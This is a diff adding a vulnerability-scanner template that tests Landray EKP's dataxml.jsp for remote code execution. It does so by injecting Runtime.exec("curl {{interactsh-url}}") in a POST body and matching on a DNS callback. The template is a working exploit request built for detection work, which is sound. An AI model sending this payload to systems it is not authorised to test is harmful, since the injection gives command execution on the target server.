@@ -1,0 +1,23 @@
+id: landray-ekp-dataxml-script-rce
+info:
+  name: Landray EKP dataxml.jsp Remote Code Execution
+  author: ProjectDiscoveryAI
+  severity: critical
+  tags: rce,dnslog
+http:
+  - method: POST
+    path:
+      - "{{BaseURL}}/ekp/sys/common/dataxml.jsp"
+    headers:
+      Content-Type: application/x-www-form-urlencoded
+    body: |
+      s_bean=sysFormulaValidate&script=Runtime.getRuntime().exec("curl+{{interactsh-url}}");&service=sysTagTagsService
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        part: interactsh_protocol
+        words:
+          - dns
